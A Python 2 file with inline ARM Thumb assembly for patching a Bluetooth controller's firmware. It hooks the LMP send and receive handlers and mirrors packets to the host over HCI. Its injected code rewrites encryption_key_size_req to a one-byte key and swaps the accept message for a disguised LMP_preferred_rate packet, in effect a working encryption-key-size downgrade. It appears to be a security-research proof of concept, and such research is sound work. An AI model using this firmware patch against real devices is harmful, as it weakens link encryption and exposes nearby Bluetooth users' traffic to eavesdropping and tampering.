#!/usr/bin/env python2

# fw.py

"""
Find MYCODE to find extra patches by Daniele/

armasm links:

    http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.kui0100a/armasm_cacbgcfj.htm
"""

from fw_5_constants import *

# Hooks for the LMP Monitor Mode
LMP_SEND_PACKET_HOOK            = 0x200d38  # This address contains the hook function for LMP_send_packet
                                            # It is NULL by default. If we set it to a function address,
                                            # the function will be called by LMP_send_packet.
LMP_MONITOR_HOOK_BASE_ADDRESS   = 0xd7600   # Start address for the INJECTED_CODE

# LMP_MONITOR_BUFFER_BASE_ADDRESS = 0xd7700   # Address of the temporary buffer for the HCI event
# LMP_MONITOR_BUFFER_BASE_ADDRESS = 0xd7710   # Address of the temporary buffer for the HCI event
LMP_MONITOR_BUFFER_BASE_ADDRESS = 0xd7760   # Address of the temporary buffer for the HCI event

LMP_MONITOR_BUFFER_LEN          = 0x80      # Length of the temporary BUFFER
LMP_MONITOR_LMP_HANDLER_ADDRESS = 0x3f3f4   # LMP_Dispatcher_3F3F4 (aka 'LMP_Dispatcher')

# NOTE: called by monitor lmp start
LMP_MONITOR_INJECTED_CODE = """
// Jump Table
// bl BUFFER_BASE_ADDRESS+1 executes hook_send_lmp
// bl BUFFER_BASE_ADDRESS+1+4 executes hook_recv_lmp
b hook_send_lmp
b hook_recv_lmp

// Hook for the LMP receive path (intercepts incoming LMP packets
// and sends them to the host via HCI)
// hook_recv_lmp uses BUFFER_BASE_ADDRESS as temp. buffer for the HCI event
hook_recv_lmp:
    push {r2-r8,lr}     // this is the original push from the hooked function LMP_Dispatcher
                        // (we have to do it here as we overwrote if with the hook patch)
    push {r0-r4,lr}     // this is to save the registers so we can overwrite
                        // them in this function

    // write hci event header to beginning of the temp. buffer
    ldr  r0, =0x%x      // adr of buffer in r0
                        // (r0 will be increased as we write to the buffer)
    mov  r4, r0         // and also backup the address in r4
    mov  r3, r0         // TODO: this is unused. remove?
    ldr  r1, =0x2cff    // HCI header: len=0x2c   event code=0xff
    strh r1, [r0]       // write HCI header to buffer
    add  r0, 2          // advance pointer
    ldr  r1, =0x504d4c5f  // Beginning of my custom header: '_LMP'
    str  r1, [r0]
    add  r0, 4
    ldr  r1, =0x015f    // continuation of custom header: '_\x01'; 01 for 'lmp recv'
    strh r1, [r0]       // Full header: _LMP_<type>    where type is 0x00 for lmp send
    add  r0, 2          //                                           0x01 for lmp recv

    // read remote bt addr from connection struct
    ldr  r1, =0x20047a  // adr inside rx_info_data_200478 at which the conn. number is stored
    ldrb r2, [r1]       // store connection number in r2
    sub  r2, 1          // connection nr minus 1 results in the connection array index
    mov  r1, 0x14C      // size r1 = size of connection struct
    mul  r2, r1         // calculate offset of connection struct entry inside the array
    ldr  r1, =0x2038E8  // address of connection array start
    add  r1, r2         // store address of connection struct in r1
    add  r1, 0x28       // at offset 0x28 is the remote BT address located
    mov  r2, 6          // memcpy the BT address into the temp. buffer
    bl   0x2e03c+1      // memcpy
    // memcpy returns end of dst buffer (8 byte aligned)
    // that means r0 now points after the BT address inside the temp. buffer

    // read LMP payload data and store it inside the temp. buffer
    ldr  r1, =0x200478  // r1 = rx_info_data_200478 
    ldr  r2, [r1]       // first 4 byte of rx_info_data contains connection number
    str  r2, [r0]       // copy the complete 4 bytes to the temp. buffer (we have space :))
    add  r0, 4
    add  r1, 4          // r1 = rx_info_data_200478 + 4 which contains the ptr to the data
    ldr  r1, [r1]       // r1 = ptr to the data.
    add  r1, 0xC        // r1 += 0xC The actual LMP payload starts at offset 0xC


    //////////////////////////////////////////////////////////////////////////////
    // NOTE: thumb (16-bit instr), 32-bit regs, little endian
    // NOTE: [r1] point to the LMP payload that is wireshark is btbrlmp
    // RECV: master LMP accept encryption_key_size_req into
    //       encryption_key_size_req
    ldrb   r2, [r1]
    cmp    r2, #0x06      // should match SEND
    bne    skip_recv_aksr
    ldrb   r2, [r1, #1]
    cmp    r2, #0x10
    bne    skip_recv_aksr
    mov    r2, #0x20      // should match SEND
    strb   r2, [r1]
    mov    r2, #0x01      // should match SEND
    strb   r2, [r1, #1]
    skip_recv_aksr:
    //////////////////////////////////////////////////////////////////////////////


    mov  r2, 24         // size for memcpy (max size of LMP should be 19 bytes; just to be safe do 24)
    bl   0x2e03c+1      // memcpy(dest=r0, src=r1, size=r2)

    // send HCI event packet (aka our temp. buffer)
    mov  r0, r4         // r4 still contains the start address of the temp. buffer
    bl   0x398c1        // send_hci_event_without_free()

    pop  {r0-r4,lr}     // restore the registers we saved
    b    0x3F3F8        // branch back into LMP_Dispatcher



// Hook for the LMP send path (intercepts outgoing LMP packets
// and sends them to the host via HCI)
// hook_recv_lmp uses BUFFER_BASE_ADDRESS+40 as temp. buffer for the HCI event
// NOTE: r0 points to the tempbuffer
hook_send_lmp:
    push {r4,r5,r6,lr}  // save some registers we want to use

    // save function parameters of the LMP_send_packet function
    mov  r5, r0         // pointer to connection struct for the packet
    mov  r4, r1         // buffer (LMP payload)

    // write hci event header to temp. buffer
    ldr  r0, =0x%x      // this is BUFFER_BASE_ADDRESS+40 (out temp. buffer)
    mov  r6, r0         // save start address of temp. buffer in r6
    ldr  r1, =0x2cff    // HCI header: len=0x2c   event code=0xff
    strh r1, [r0]       // write HCI header to temp. buffer
    add  r0, 2
    ldr  r1, =0x504d4c5f // Beginning of my custom header: '_LMP'
    str  r1, [r0]
    add  r0, 4
    ldr  r1, =0x005f    // continuation of custom header: '_\x00'; 01 for 'lmp send'
    strh r1, [r0]       // Full header: _LMP_<type>    where type is 0x00 for lmp send
    add  r0, 2          //                                           0x01 for lmp recv

    // get bt addr of remote device from connection struct
    mov  r1, r5         // r5 is ptr to connection struct
    add  r1, 0x28       // BT address is at offset 0x28
    mov  r2, 6

    bl   0x2e03c+1      // memcpy

    // memcpy returns end of dst buffer (8 byte aligned)
    // that means r0 now points after the BT address inside the temp. buffer

    // get connection number (we send it to the host to be consistent with the
    // receive path; actually it is not used)
    mov  r1, 0          // first write 4 zero-bytes
    str  r1, [r0]
    add  r0, 2          // then write the conn. number in the middle of the bytes
    ldr  r2, [r5]       // conn. number is at offset 0x0 of the conn. struct
    strb r2, [r0]
    add  r0, 2

    // read LMP data and store the LMP payload into the temp. buffer
    // r0 currencly point to the empy part of temp buffer
    add  r1, r4, 0xC    // start of LMP packet is at offset 0xC of rx_info_data_200478

    //////////////////////////////////////////////////////////////////////////////
    // NOTE: thumb (16-bit instr), 32-bit regs, little endian
    // NOTE: [r1] point to the LMP payload that is wireshark is btbrlmp

    // SEND: master sends LMP_encryption_key_size_req of 0x01
    ldrb  r2, [r1]
    cmp   r2, #0x20    // should match RECV
    bne   skip_sent_ksr
    mov   r2, #0x01    // should match RECV
    strb  r2, [r1, #1]
    skip_sent_ksr:

    // SEND: master modifies LMP accept encryption_key_size_req into
    //       LMP_preferred rate 0x4870
    ldrb  r2, [r1]
    cmp   r2, #0x06    // should match RECV
    bne   skip_send_aksr
    ldrb  r2, [r1, #1]
    cmp   r2, #0x10
    bne   skip_send_aksr
    mov   r2, #0x48      // lmp_pay[0]
    strb  r2, [r1]
    mov   r2, #0x70      // lmp_pay[1]
    strb  r2, [r1, #1]
    skip_send_aksr:

    //////////////////////////////////////////////////////////////////////////////


    mov  r2, 24         // size for memcpy (max size of LMP should be 19 bytes; just to be safe do 24)

    bl   0x2e03c+1      // memcpy(dest=r0, source=r1, size=r2)

    // send HCI event packet (aka our temp. buffer)
    mov  r0, r6         // r6 contains start address of the temp. buffer

    bl   0x398c1        // send_hci_event_without_free()


    //ldrb  r2, [r1]
    //cmp   r2, #0x20
    mov r0, 0           // we need to return 0 to indicate to the hook code
                        // that the original LMP_send_packet function should
                        // continue to be executed
    //bne   skip_sent_send
    //mov r0, 1
    //skip_sent_send:
    pop  {r4,r5,r6,pc}  // restore saved registers and return
    """ % (LMP_MONITOR_BUFFER_BASE_ADDRESS, LMP_MONITOR_BUFFER_BASE_ADDRESS+0x40)



